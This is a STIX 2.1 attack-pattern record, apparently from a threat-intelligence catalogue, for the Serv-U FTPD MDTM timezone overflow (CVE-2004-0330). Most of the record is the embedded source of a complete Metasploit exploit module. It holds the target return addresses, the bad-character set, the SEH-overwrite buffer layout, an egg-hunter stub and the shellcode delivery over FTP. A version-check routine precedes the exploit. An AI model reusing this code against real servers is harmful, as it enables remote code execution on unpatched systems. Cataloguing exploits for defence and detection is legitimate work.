{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9993dc8c-0f07-4907-a32f-976b23fde5f2",
    "created": "2024-08-14T16:50:42.138404Z",
    "modified": "2024-08-14T16:50:42.138409Z",
    "name": "Serv-U FTPD MDTM Overflow",
    "description": " This is an exploit for the Serv-U\\'s MDTM command timezone overflow. It has been heavily tested against versions 4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with success against nt4/2k/xp/2k3. I have also had success against version 3 but only tested 1 version/os. The bug is in all versions prior to 5.0.0.4, but this exploit will not work against versions not listed above. You only get one shot, but it should be OS/SP independent.  This exploit is a single hit, the service dies after the shellcode finishes execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/servu_mdtm.rb",
            "external_id": "servu_mdtm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0330"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Serv-U FTPD MDTM Overflow',\n      'Description'    => %q{\n          This is an exploit for the Serv-U\\'s MDTM command timezone\n        overflow. It has been heavily tested against versions\n        4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with success against\n        nt4/2k/xp/2k3. I have also had success against version 3,\n        but only tested 1 version/os. The bug is in all versions\n        prior to 5.0.0.4, but this exploit will not work against\n        versions not listed above. You only get one shot, but it\n        should be OS/SP independent.\n\n        This exploit is a single hit, the service dies after the\n        shellcode finishes execution.\n      },\n      'Author'         => [ 'spoonm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0330'],\n          [ 'OSVDB', '4073'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html'],\n          [ 'BID', '9751'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Serv-U Uber-Leet Universal ServUDaemon.exe', # Tested OK - hdm 11/25/2005\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x00401877,\n            },\n          ],\n          [\n            'Serv-U 4.0.0.4/4.1.0.0/4.1.0.3 ServUDaemon.exe',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x0040164d,\n            },\n          ],\n          [\n            'Serv-U 5.0.0.0 ServUDaemon.exe',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x0040167e,\n            },\n          ],\n        ],\n      'DisclosureDate' => 'Feb 26 2004',\n      'DefaultTarget' => 0))\n\n    register_advanced_options(\n      [\n        OptInt.new('SEHOffset', [ false, \"Offset from beginning of timezone to SEH\", 47 ]),\n        OptInt.new('ForceDoubling', [ false, \"1 to force \\\\xff doubling for 4.0.0.4, 0 to disable it, 2 to autodetect\", 2 ]),\n      ])\n\n  end\n\n  # From 5.0.0.4 Change Log\n  # \"* Fixed bug in MDTM command that potentially caused the daemon to crash.\"\n  #\n  # Nice way to play it down boys\n  #\n  # Connected to ftp2.rhinosoft.com.\n  # 220 ProFTPD 1.2.5rc1 Server (ftp2.rhinosoft.com) [62.116.5.74]\n  #\n  # Heh :)\n\n  def check\n    connect\n    disconnect\n\n    case banner\n      when /Serv-U FTP Server v4\\.1/\n        vprint_status('Found version 4.1.0.3, exploitable')\n        return Exploit::CheckCode::Appears\n\n      when /Serv-U FTP Server v5\\.0/\n        vprint_status('Found version 5! 5.0.0.0 may be exploitable, but not 5.0.0.4');\n        return Exploit::CheckCode::Detected\n\n      when /Serv-U FTP Server v4\\.0/\n        vprint_status('Found version 4.0.0.4 or 4.1.0.0, additional check.');\n        send_user(datastore['USER'])\n        send_pass(datastore['PASS'])\n        if (double_ff?())\n          vprint_status('Found version 4.0.0.4, exploitable');\n          return Exploit::CheckCode::Appears\n        else\n          vprint_status('Found version 4.1.0.0, exploitable');\n          return Exploit::CheckCode::Appears\n        end\n\n      when /Serv\\-U FTP Server/\n        vprint_status('Found an unknown version, try it!');\n        return Exploit::CheckCode::Detected\n\n      else\n        vprint_status('We could not recognize the server banner')\n        return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    c = connect_login\n    return if not c\n\n    print_status(\"Trying target #{target.name}...\")\n\n    # Should have paid more attention to skylined's exploit, only after figuring\n    # out how my payloads were getting transformed did I remember seeing \\xff\n    # doubling in his CHMOD exploit, arg!\n    shellcode = payload.encoded\n\n    case datastore['ForceDoubling']\n      when 1\n        print_status(\"Forced doubling of all \\\\xff sequences in the encoded payload\")\n        shellcode.gsub!(/\\xff/, \"\\xff\\xff\")\n      when 0\n        print_status(\"Forced doubling has been disabled\")\n      when 2\n        if (double_ff?())\n          print_status(\"Forced doubling enabled after detection of version 4.0.0.4\")\n          shellcode.gsub!(/\\xff/, \"\\xff\\xff\")\n        end\n    end\n\n    # Searcher expects address to start scanning at in edi\n    # Since we got here via a pop pop ret, we can just the address of the jmp\n    # off the stack, add esp, BYTE -4 ; pop edi\n\n    search_rtag = \"\\x34\\x33\\x32\\x31\" # +1 / 0 / -1 [start, end, stored]\n    search_stub = Rex::Arch::X86.searcher(search_rtag)\n    search_code = \"\\x83\\xc4\\xfc\\x5f\" + search_stub + 'BB'\n    if (datastore['SEHOffset'] < search_code.length)\n      print_error(\"Not enough room for search code, adjust SEHOffset\")\n      return\n    end\n\n    jump_back = Rex::Arch::X86.jmp_short('$+' + (-1 * search_code.length).to_s) + 'BB'\n\n    buf = 'MDTM 20031111111111+' + ('A' * (datastore['SEHOffset'] - search_code.length))\n    buf << search_code\n    buf << jump_back\n    buf << [target.ret].pack('V')\n    buf << ' /'\n    buf << Rex::Arch::X86.dword_adjust(search_rtag, 1)\n    buf << shellcode\n    buf << search_rtag\n\n    send_cmd( [buf], false )\n\n    handler\n    disconnect\n  end\n\n  def double_ff?\n    res = send_cmd( ['P@SW'], true )\n    return (res and res =~ /^500/) ? true : false\n  end\nend\n",
    "x_mitre_disclosure_date": "Feb 26 2004",
    "x_mitre_platforms": [
        "win'"
    ]
}